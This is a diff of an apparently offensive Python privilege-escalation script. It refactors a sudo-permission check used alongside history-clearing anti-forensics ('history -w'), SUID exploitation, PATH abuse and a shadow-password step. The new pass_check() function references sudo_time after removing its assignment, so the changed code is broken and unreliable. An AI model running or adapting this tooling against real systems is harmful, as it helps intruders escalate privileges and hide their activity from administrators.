@@ -260,21 +260,27 @@ def disable_hist():
    os.system("history -w 2>/dev/null")
 
 
-# check for binaries that can be run as sudo and print privesc script to screen
-def sudo_l():
-   os.system("echo 'suid files' > /tmp/sudo_l.txt")
-   print("\n###--- please run 'sudo -l >> /tmp/sudo_l.txt' then rerun this script to find sudoable commands ---###")
-   time.sleep(5)
-   print("\n### finding binaries you can run as sudo... ###")
-
+# check if user needs password to run sudo
+def pass_check():
    # check to see if user needs password to run sudo
-   sudo_time = os.system("time timeout -k 5 5 sudo -l &>/dev/null")
-   sudo_no_pass = None
+   os.system("time timeout -k 5 5 sudo -l > /tmp/time.txt")
    if sudo_time > float('1.0'):
      sudo_no_pass = False
    else:
       sudo_no_pass = True
       print("\n-+- password not needed to run sudo commands -+-")
+   return sudo_no_pass
+
+
+# check for binaries that can be run as sudo and print privesc script to screen
+def sudo_l(check):
+   if check:
+      os.system("sudo -l >> /tmp/sudo_l.txt")
+   else:
+      os.system("echo 'sudo -l' >> /tmp/sudo_l.txt")
+      print("\n###--- please run 'sudo -l >> /tmp/sudo_l.txt' then rerun this script to find sudoable commands ---###")
+      time.sleep(5)
+   print("\n### finding binaries you can run as sudo... ###")
 
    # commands that will be printed to screen bc they require user interation 
    sudo_bins_print = {
@@ -338,8 +344,6 @@ def sudo_l():
             exit()
          else:
             continue
-
-   return sudo_no_pass
 
 
 # try SUID/GUID files exloitation
@@ -866,7 +870,8 @@ if module == "enum":
 elif module == "priv":
    # call privilege escalation functions
    disable_hist()
-   sudo_l()
+   check = pass_check()
+   sudo_l(check)
    suid()
    path()
    pass_shadow(username,password)
